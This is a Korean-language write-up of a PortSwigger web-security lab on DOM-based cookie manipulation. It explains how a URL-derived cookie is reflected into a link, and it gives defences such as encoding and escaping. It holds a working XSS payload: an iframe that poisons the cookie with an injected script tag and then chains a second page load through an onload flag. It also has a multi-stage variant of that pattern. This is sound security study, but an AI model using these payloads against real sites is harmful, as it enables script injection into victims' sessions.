# Lab: DOM-based cookie manipulation

## 개요

- **난이도**: Practitioner
- **주제**: DOM-based Cookie Manipulation — 쿠키 값 인젝션 / XSS / iframe onload 2단계 실행
- **링크**: https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

## 목표

페이지가 `location.href` 를 쿠키에 저장하고, 그 쿠키 값을 다른 페이지의 링크 `href` 에 반영하는 취약점을 이용한다. 악성 URL 로 쿠키를 오염시킨 뒤, 쿠키가 반영되는 페이지에서 XSS 를 실행시킨다.

## 취약점 구조 — 2단계 흐름

```
[1단계] 쿠키 오염
  상품 페이지 방문 시 JS 가 현재 URL 을 쿠키에 저장:
  document.cookie = 'lastViewedProduct=' + window.location.href + '; SameSite=None; Secure';

  조작된 URL 방문 시:
  /product?productId=1&'><script>print()</script>
  → 쿠키: lastViewedProduct=...&'><script>print()</script>

[2단계] 쿠키 반영 → XSS 실행
  홈페이지(또는 다른 페이지)에서 쿠키 값을 링크에 반영:
  <a href='[lastViewedProduct 쿠키 값]'>Last viewed</a>

  쿠키가 오염된 경우:
  <a href='...&'><script>print()</script>'>Last viewed</a>
  → HTML 파싱 → <script>print()</script> 실행
```

## 2단계가 필요한 이유

```
문제:
  쿠키를 오염시키는 페이지(상품 페이지)와
  쿠키가 반영되는 페이지(홈페이지)가 다름

  1단계(상품 페이지 방문)만으로는 XSS 미실행
  2단계(홈페이지 방문)에서 XSS 실행

해결:
  iframe onload 를 이용해 두 단계를 순서대로 자동 실행
  1단계 완료 → onload 발화 → 2단계(홈페이지) 로드
```

## 공격 방법

### 페이로드

```html
<iframe
  src="https://VULNERABLE.com/product?productId=1&'><script>print()</script>"
  onload="if(!window.x) this.src='https://VULNERABLE.com/', window.x=1"
></iframe>
```

### `window.x` 플래그 — 무한 루프 방지

```javascript
onload="if(!window.x) this.src='https://VULNERABLE.com/', window.x=1"

// 실행 순서:
// [1번째 onload] 상품 페이지 로드 완료
//   window.x 미설정 → !window.x = true → 조건 통과
//   this.src = 'https://VULNERABLE.com/'  → 홈페이지로 변경
//   window.x = 1                           → 플래그 설정

// [2번째 onload] 홈페이지 로드 완료 → XSS 실행
//   window.x = 1 → !window.x = false → 조건 불통과
//   → this.src 변경 안 함 → 무한 루프 없음

// window.x 가 없었다면:
//   홈페이지 로드 → onload → this.src = 홈페이지 → 다시 로드 → 무한 반복
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문
   iframe 로드:
   /product?productId=1&'><script>print()</script>

2. 상품 페이지 JS:
   document.cookie = 'lastViewedProduct=' +
   'https://VULNERABLE.com/product?productId=1&\'><script>print()</script>'

3. 1번째 onload 발화:
   window.x 없음 → 조건 통과
   this.src = 'https://VULNERABLE.com/'  (홈페이지로 전환)
   window.x = 1

4. 홈페이지 로드:
   서버가 lastViewedProduct 쿠키를 읽어 HTML 에 반영:
   <a href='https://...&'><script>print()</script>'>Last viewed</a>
   → <script>print()</script> 실행 → XSS!

5. 2번째 onload 발화:
   window.x = 1 → 조건 불통과 → src 변경 없음 → 종료
```

## 이전 랩들과의 비교

| 항목 | 004 랩 | 005 랩 (이번) |
|------|--------|--------------|
| 소스 | `location.search` | `location.href` → 쿠키 |
| 싱크 | `location.href` | HTML 링크 `href` 속성 |
| 영향 | 리다이렉트 | XSS 실행 |
| 단계 | 1단계 (즉시) | 2단계 (쿠키 오염 → 반영) |
| exploit | URL 파라미터만 | iframe + onload 2단계 |
| 플래그 | 불필요 | `window.x` 무한루프 방지 |

## 핵심 정리

- `document.cookie` 에 `location.href` 를 그대로 저장하면, URL 에 악성 값을 넣어 **쿠키를 오염**시킬 수 있다.
- 오염된 쿠키가 페이지에 HTML 로 반영될 때 XSS 가 발생한다 — **저장형 DOM XSS** 에 가까운 패턴.
- `iframe onload` + `window.x` 플래그 조합으로 2단계 순차 실행을 구현하고 무한 루프를 방지한다.
- **방어**:
  - `location.href` 를 쿠키에 저장할 때 인코딩/검증
  - 쿠키 값을 HTML 에 반영할 때 이스케이프 처리
  - `HttpOnly` 쿠키로 JS 접근 차단 (단, 이 경우 JS 가 쿠키를 설정하므로 해당 없음)

## 배운 점 및 추가 학습

### 1. DOM 기반 쿠키 조작의 특성

```javascript
// 취약한 쿠키 설정 패턴:
document.cookie = 'lastViewed=' + window.location.href;
// → URL 에 HTML 특수문자 삽입 가능
// → 쿠키에 악성 값 저장

// 쿠키가 반영되는 위치:
// 서버 사이드: 쿠키 값을 HTML 에 삽입 → Stored XSS 유사
// 클라이언트 사이드: JS 가 쿠키를 읽어 DOM 에 삽입 → DOM XSS

// 안전한 쿠키 설정:
document.cookie = 'lastViewed=' + encodeURIComponent(window.location.href);
// → 반영 시에도 인코딩된 값 → HTML 태그로 해석 안 됨
```

### 2. iframe onload 다단계 실행 패턴

```javascript
// 패턴: 첫 로드에서 src 변경, 두 번째 로드에서 XSS 실행
<iframe
  src="1단계_URL"
  onload="if(!window.x) this.src='2단계_URL', window.x=1"
>

// 응용: 3단계 이상
<iframe
  src="1단계_URL"
  onload="
    if(window.step === undefined) {
      this.src = '2단계_URL';
      window.step = 1;
    } else if(window.step === 1) {
      this.src = '3단계_URL';
      window.step = 2;
    }
  "
>

// window.x / window.step 의 역할:
//   onload 는 src 변경 때마다 발화
//   플래그 없으면 → src 변경 → onload → src 변경 → 무한 루프
//   플래그로 몇 번째 실행인지 추적 → 단계별 제어
```

### 3. DOM 기반 취약점 소스 확장

```
지금까지 학습한 소스 유형:

postMessage (001~003):
  window.addEventListener('message', e => sink(e.data))

location.search (004):
  location.href = new URLSearchParams(location.search).get('url')

document.cookie ← 이번 랩:
  document.cookie = 'key=' + location.href   // 쿠키 오염
  element.href = getCookie('key')            // 반영 시 XSS

기타 소스:
  location.hash    → #뒤의 값
  window.name      → 탭 이름 (크로스 오리진 유지)
  document.referrer → 이전 페이지 URL
  localStorage     → 클라이언트 저장소
```

### 4. 쿠키 조작과 SameSite 의 관계

```
이번 랩의 쿠키:
  document.cookie = 'lastViewedProduct=...; SameSite=None; Secure'

SameSite=None 의 의미:
  크로스 사이트 요청에도 쿠키 전송
  → 외부 iframe 에서 상품 페이지 로드 시
  → 서버에 기존 쿠키 전송 + 새 쿠키 설정 가능

SameSite=Strict 였다면:
  iframe(외부 오리진)에서 상품 페이지 요청 시 쿠키 미전송
  → 쿠키 오염은 여전히 가능 (document.cookie 는 JS 레벨)
  → 반영 시 영향은 동일

→ 이 공격에서 SameSite 는 핵심 방어 요소가 아님
   쿠키 값 자체의 검증/인코딩이 핵심 방어
```
